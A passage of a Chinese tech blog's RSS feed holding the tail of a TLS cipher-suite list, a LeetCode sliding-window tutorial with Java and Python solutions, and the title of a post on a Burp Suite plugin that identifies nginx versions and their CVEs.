class="headerlink" title="附录：所有密码套件"></a>附录：所有密码套件</h2><p>TLS1.3 密码套件</p><pre><code>TLS13-AES128-GCM-SHA256TLS13-AES256-GCM-SHA384TLS13-CHACHA20-POLY1305-SHA256TLS13-AES128-CCM-SHA256TLS13-AES128-CCM-8-SHA256</code></pre><p>TLS1.2 密码套件</p><pre><code>TLS_RSA_WITH_NULL_SHA256TLS_RSA_WITH_AES_128_CBC_SHA256TLS_RSA_WITH_AES_256_CBC_SHA256TLS_RSA_WITH_AES_128_GCM_SHA256TLS_RSA_WITH_AES_256_GCM_SHA384TLS_DH_RSA_WITH_AES_128_CBC_SHA256TLS_DH_RSA_WITH_AES_256_CBC_SHA256TLS_DH_RSA_WITH_AES_128_GCM_SHA256TLS_DH_RSA_WITH_AES_256_GCM_SHA384TLS_DH_DSS_WITH_AES_128_CBC_SHA256TLS_DH_DSS_WITH_AES_256_CBC_SHA256TLS_DH_DSS_WITH_AES_128_GCM_SHA256TLS_DH_DSS_WITH_AES_256_GCM_SHA384TLS_DHE_RSA_WITH_AES_128_CBC_SHA256TLS_DHE_RSA_WITH_AES_256_CBC_SHA256TLS_DHE_RSA_WITH_AES_128_GCM_SHA256TLS_DHE_RSA_WITH_AES_256_GCM_SHA384TLS_DHE_DSS_WITH_AES_128_CBC_SHA256TLS_DHE_DSS_WITH_AES_256_CBC_SHA256TLS_DHE_DSS_WITH_AES_128_GCM_SHA256TLS_DHE_DSS_WITH_AES_256_GCM_SHA384TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384TLS_DH_anon_WITH_AES_128_CBC_SHA256TLS_DH_anon_WITH_AES_256_CBC_SHA256TLS_DH_anon_WITH_AES_128_GCM_SHA256TLS_DH_anon_WITH_AES_256_GCM_SHA384</code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2021/07/06/htps-recommend/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>滑动窗口相关题目</title>
      <link>https://m01ly.github.io/2021/06/07/leetcode-slidewindow/</link>
      <guid>https://m01ly.github.io/2021/06/07/leetcode-slidewindow/</guid>
      <pubDate>Mon, 07 Jun 2021 02:55:32 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;滑动窗口&lt;/p&gt;
&lt;p&gt;什么是滑动窗口？&lt;/p&gt;
&lt;p&gt;其实就是一个队列,比如例题中的 abcabcbb，进入这个队列（窗口）为 abc 满足题目要求，当再进入 a，队列变成了 abca，这时候不满足要求。所以，我们要移动这个队列！&lt;/p&gt;
&lt;p&gt;如何移动？&lt;/p&gt;
&lt;p&gt;我们只要把队列的左边的元素移出就行了，直到满足题目要求！&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>滑动窗口</p><p>什么是滑动窗口？</p><p>其实就是一个队列,比如例题中的 abcabcbb，进入这个队列（窗口）为 abc 满足题目要求，当再进入 a，队列变成了 abca，这时候不满足要求。所以，我们要移动这个队列！</p><p>如何移动？</p><p>我们只要把队列的左边的元素移出就行了，直到满足题目要求！</p><a id="more"></a><p>相关题目如下表所示</p><table><thead><tr><th align="left">题目</th><th></th></tr></thead><tbody><tr><td align="left"><a href="https://leetcode-cn.com/problems/maximum-subarray/">53.最大子序和</a></td><td>简单</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3.无重复字符的最长子串</a></td><td>中等</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">209.度最小的子数组</a></td><td>中等</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/contains-duplicate-ii/">219存在重复元素</a></td><td>中等</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/sliding-window-maximum/">239/剑指 Offer 59 - I 滑动窗口最大值</a></td><td>困难</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/permutation-in-string/">567. 字符串的排列</a></td><td>中等</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">718. 最长重复子数组</a></td><td>中等</td></tr><tr><td align="left">402.替换后的最长重复字符</td><td></td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/substring-with-concatenation-of-all-words/">30.串联所有单词的子串</a></td><td>困难</td></tr><tr><td align="left"><a href="https://leetcode-cn.com/problems/minimum-window-substring/">76. 最小覆盖子串</a></td><td>困难</td></tr></tbody></table><h2 id="1-leetcode53-最大子序和"><a href="#1-leetcode53-最大子序和" class="headerlink" title="1  leetcode53. 最大子序和"></a>1  <a href="https://leetcode-cn.com/problems/maximum-subarray/">leetcode53. 最大子序和</a></h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p><p>示例 1：</p><p>输入：nums = [-2,1,-3,4,-1,2,1,-5,4]<br>输出：6<br>解释：连续子数组 [4,-1,2,1] 的和最大，为 6 。</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>动态规划的是首先对数组进行遍历，当前最大连续子序列和为 sum，结果为 ans<br>如果 sum &gt; 0，则说明 sum 对结果有增益效果，则 sum 保留并加上当前遍历数字<br>如果 sum &lt;= 0，则说明 sum 对结果无增益效果，需要舍弃，则 sum 直接更新为当前遍历数字<br>每次比较 sum 和 ans的大小，将最大值置为ans，遍历结束返回结果<br>时间复杂度：O(n)</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxSubArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>sum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                sum <span class="token operator">+=</span> num<span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                sum <span class="token operator">=</span> num<span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            ans <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：<em>O</em>(<em>n</em>)，进行了一次遍历。</li><li>空间复杂度：O(1)。</li></ul><h2 id="2-leetcode3-无重复字符的最长子串"><a href="#2-leetcode3-无重复字符的最长子串" class="headerlink" title="2 leetcode3. 无重复字符的最长子串"></a>2 <a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">leetcode3. 无重复字符的最长子串</a></h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>示例 1:</strong></p><pre class="line-numbers language-bash"><code class="language-bash">输入: s <span class="token operator">=</span> <span class="token string">"abcabcbb"</span>输出: 3 解释: 因为无重复字符的最长子串是 <span class="token string">"abc"</span>，所以其长度为 3。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>示例 2:</strong></p><pre class="line-numbers language-bash"><code class="language-bash">输入: s <span class="token operator">=</span> <span class="token string">"bbbbb"</span>输出: 1解释: 因为无重复字符的最长子串是 <span class="token string">"b"</span>，所以其长度为 1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>示例 3:</strong></p><pre class="line-numbers language-bash"><code class="language-bash">输入: s <span class="token operator">=</span> <span class="token string">"pwwkew"</span>输出: 3解释: 因为无重复字符的最长子串是 <span class="token string">"wke"</span>，所以其长度为 3。     请注意，你的答案必须是 子串 的长度，<span class="token string">"pwke"</span> 是一个子序列，不是子串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>示例 4:</strong></p><pre class="line-numbers language-bash"><code class="language-bash">输入: s <span class="token operator">=</span> <span class="token string">""</span>输出: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>本题使用滑动窗口的思路。</p><p>步骤：</p><p>（1）start不动，end向后移动</p><p>（2）当end遇到重复字符，start应该放在位置=MAX（上一个重复字符的位置的后一位 map.get(nums[i]) + 1 ，原有位置start)的最大值，同时记录最长的长度ans。</p><pre><code> 这里解释下为啥子start需要取最大值：以 deedf 为例， 在经过第一轮判断e重复之后，start和end同时指向第二个e，end继续向后移，此时遇到了重复的d字符，但此时map中所包含的d的kv值仍是第一个d的为0，而此时start的位置为3。此时为了避免start指针回到了第一个位置，所以需要判断最大值使得指针不会回到最开始的d的位置,所以start=max(0+1,3)=3。</code></pre><p>​    简单来说，一旦start的位置变更之后，对于start之前的元素仍是在map集合中的，如果没有经过比较，一旦end遇到了重复元素的情况会优先从map中存储的前面的字符查找，这并不是期望的结果 </p><p>（3）怎样判断是否遇到重复字符，且怎么知道上一个重复字符的位置？–用哈希字典的key来判断是否重复，用value来记录该字符的最新位置。</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type s: str        :rtype: int        """</span>        hashIndex<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;#字典</span>        start<span class="token punctuation">,</span>ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>        <span class="token keyword">for</span> end<span class="token punctuation">,</span>v <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#end位置，v表示value</span>            <span class="token keyword">if</span> v <span class="token keyword">in</span> hashIndex<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#重复</span>                start<span class="token operator">=</span>max<span class="token punctuation">(</span>hashIndex<span class="token punctuation">.</span>get<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>            hashIndex<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">=</span>end            ans<span class="token operator">=</span>max<span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span>        <span class="token keyword">return</span>  ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：<em>O</em>(n)，进行了一次遍历。</li><li>空间复杂度：O(n)，借助hash存储过程。</li></ul><h2 id="3-leetcode-219-存在重复元素-II"><a href="#3-leetcode-219-存在重复元素-II" class="headerlink" title="3 leetcode 219. 存在重复元素 II"></a>3 <a href="https://leetcode-cn.com/problems/contains-duplicate-ii/">leetcode 219. 存在重复元素 II</a></h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数数组和一个整数 <em>k</em>，判断数组中是否存在两个不同的索引 <em>i</em> 和 <em>j</em>，使得 <strong>nums [i] = nums [j]**，并且 <em>i</em> 和 <em>j</em> 的差的 **绝对值</strong> 至多为 <em>k</em>。</p><p>维护一个哈希表record，即滑动窗口，里面始终最多包含 k 个元素，当出现重复值时则说明在 k 距离内存在重复元素。每次遍历一个元素则将其加入哈希表中，如果哈希表的大小大于 k，则移除最前面的数字<br>示例 1:</p><p>输入: nums = [1,2,3,1], k = 3<br>输出: true<br>示例 2:</p><p>输入: nums = [1,0,1,1], k = 1<br>输出: true<br>示例 3:</p><p>输入: nums = [99,99], k = 2<br>输出: false</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">containsNearbyDuplicate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :type k: int        :rtype: bool        """</span>        record<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125; </span>        start<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>v <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> v <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#存在重复值则说明在 k 距离内存在重复元素</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#不在 就加进字典中</span>            record<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">=</span>i            <span class="token keyword">if</span> len<span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token operator">></span>k<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#如果哈希表的大小大于 k，则移除最前面的数字</span>                record<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：<em>O</em>(<em>n</em>)，进行了一次遍历。</li><li>空间复杂度：O(k)，借助hash存储过程。</li></ul><p>参考：</p><p><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/solution/hua-dong-chuang-kou-by-powcai/">https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/solution/hua-dong-chuang-kou-by-powcai/</a></p><h2 id="4-leetcode209长度最小的子数组"><a href="#4-leetcode209长度最小的子数组" class="headerlink" title="4 leetcode209长度最小的子数组"></a>4 leetcode209长度最小的子数组</h2><p>给定一个含有 n 个正整数的数组和一个正整数 target 。</p><p>找出该数组中满足其和 ≥ target 的长度最小的 连续子数组 [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</p><p>示例 1：</p><p>输入：target = 7, nums = [2,3,1,2,4,3]<br>输出：2<br>解释：子数组 [4,3] 是该条件下的长度最小的子数组。<br>示例 2：</p><p>输入：target = 4, nums = [1,4,4]<br>输出：1</p><h4 id="解法1-：滑动窗口解法"><a href="#解法1-：滑动窗口解法" class="headerlink" title="解法1  ：滑动窗口解法"></a>解法1  ：滑动窗口解法</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><p>定义两个指针 start和 end分别表示子数组（滑动窗口窗口）的开始位置和结束位置，维护变量 sum存储子数组中的元素和（即从 nums[start]到 nums[end] 的元素和）。</p><p>初始状态下，start和 end都指向下标 0，sum的值为 0。</p><p>每一轮迭代，将 nums[end] 加到 sum，如果sum≥target，则更新子数组的最小长度（此时子数组的长度是end−start+1），然后将 nums[start] 从 sum 中减去并将start 右移，直到sum&lt;s，在此过程中同样更新子数组的最小长度。在每一轮迭代的最后，将end 右移。</p><h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minSubArrayLen</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type target: int        :type nums: List[int]        :rtype: int        """</span>        n<span class="token operator">=</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        start<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>        sum<span class="token operator">=</span><span class="token number">0</span>        ans<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">while</span> end<span class="token operator">&lt;</span>n<span class="token punctuation">:</span>            sum<span class="token operator">=</span>sum<span class="token operator">+</span>nums<span class="token punctuation">[</span>end<span class="token punctuation">]</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>sum<span class="token operator">>=</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 大于target 去除滑动窗口前面的  直到之和小于target</span>                ans <span class="token operator">=</span> min<span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span>                sum<span class="token operator">=</span>sum<span class="token operator">-</span>nums<span class="token punctuation">[</span>start<span class="token punctuation">]</span>                start <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">1</span>            end<span class="token operator">=</span>end<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">return</span> <span class="token number">0</span> <span class="token keyword">if</span> ans<span class="token operator">==</span>n<span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">else</span> ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a><strong>复杂度分析</strong></h5><p><strong>时间复杂度：</strong>O(n)，其中 n是数组的长度。指针start 和 end最多各移动n 次。</p><p>两个while的循环为什么是O(n)?</p><p>因为： 两个指针都是单调的向右移动，所以至多2n </p><p>内循环有触发条件，也就是说在遍历外循环的过程中，不是每次遍历都会触发内循环执行。也就是说内循环触发的次数是一个常量，随着n的规模变大，触发次数并不一定变大。也就是说，在内循环触发时，最坏情况下复杂度为n，但受到触发次数限制。 假设触发次数为常量A，按照上面最坏情况计算，总的执行次数可表示为N+AN=(A+1)N，(A+1)为常量，因此时间复杂度是O(n) </p><p><strong>空间复杂度：</strong>O(1)。</p><h4 id="解法2-：前缀和-二分查找"><a href="#解法2-：前缀和-二分查找" class="headerlink" title="解法2  ：前缀和+二分查找"></a>解法2  ：前缀和+二分查找</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><p>前缀和：为了使用二分查找，需要额外创建一个数组 sums 用于存储数组 nums 的前缀和，其中sums[i] 表示从nums[0] 到 nums[i] 的元素和。</p><p>例如nums = [2,3,1,2,4,3]中对应的sums=[0, 2, 5, 6, 8, 12]。</p><p>sums[0] = 0 意味着前 0 个元素的前缀和为 0        </p><p>sums[1] = A[0] 前 1 个元素的前缀和为 A[0] </p><p>得到前缀和之后，对于每个开始下标 i，可通过二分查找得到大于或等于i的最小下标mid，使得sums[bound]−sums[i]≥s，并更新子数组的最小长度:此时子数组的长度是bound−i。</p><h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a><strong>代码</strong></h5><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minSubArrayLen</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type target: int        :type nums: List[int]        :rtype: int        """</span>        n<span class="token operator">=</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        ans<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>        sums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#得到前缀和</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>sums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>sums<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#在sums数组中使用二分查找  固定i 查找sums[bound]-sums[i]>=target，则子数组的长度是bound−i</span>        <span class="token comment" spellcheck="true">#sums=[0, 2, 5, 6, 8, 12,15]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> i            right <span class="token operator">=</span>n            <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>                mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">-</span>sums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>                    ans<span class="token operator">=</span>min<span class="token punctuation">(</span>mid<span class="token operator">-</span>i<span class="token punctuation">,</span>ans<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">-</span>sums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span>target<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#往左移动</span>                    ans<span class="token operator">=</span>min<span class="token punctuation">(</span>mid<span class="token operator">-</span>i<span class="token punctuation">,</span>ans<span class="token punctuation">)</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">return</span> <span class="token number">0</span> <span class="token keyword">if</span> ans<span class="token operator">==</span>n<span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">else</span> ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="复杂度分析-4"><a href="#复杂度分析-4" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p><strong>时间复杂度：</strong>O(nlogn)。</p><p>空间复杂度：O(1）</p><h2 id="5-leetcode718-最长重复子数组"><a href="#5-leetcode718-最长重复子数组" class="headerlink" title="5 leetcode718. 最长重复子数组"></a>5 <a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">leetcode718. 最长重复子数组</a></h2><p>给两个整数数组 A 和 B ，返回两个数组中 公共的、长度最长的子数组的长度。</p><p>示例：</p><p>输入：<br>A: [1,2,3,2,1]<br>B: [3,2,1,4,7]<br>输出：3<br>解释：<br>长度最长的公共子数组是 [3, 2, 1] 。</p><h2 id="6-leetcode239-滑动窗口最大值"><a href="#6-leetcode239-滑动窗口最大值" class="headerlink" title="6 leetcode239. 滑动窗口最大值"></a>6 <a href="https://leetcode-cn.com/problems/sliding-window-maximum/">leetcode239. 滑动窗口最大值</a></h2><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。返回滑动窗口中的最大值。</p><p> 示例 1：</p><p>输入：nums = [1,3,-1,-3,5,3,6,7], k = 3<br>输出：[3,3,5,5,6,7]<br>解释：<br>滑动窗口的位置                最大值</p><hr><p>[1  3  -1] -3  5  3  6  7       3<br> 1 [3  -1  -3] 5  3  6  7       3<br> 1  3 [-1  -3  5] 3  6  7       5<br> 1  3  -1 [-3  5  3] 6  7       5<br> 1  3  -1  -3 [5  3  6] 7       6<br> 1  3  -1  -3  5 [3  6  7]      7</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2021/06/07/leetcode-slidewindow/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>开发burpsuite插件-识别nginx版本并列出已知CVE</title>
      <link>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/</link>
      <guid>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/</guid>
      <pubDate>Mon, 24 May 2021 09:39:05 GMT</pubDate>
      
      <description>&lt;p&gt;最近需要开发一个插件：首先需要识别初nginx的版本号，其次需要列出该版本号存在的CVE漏洞列表。&lt;/p&gt;</description>
      
      
      
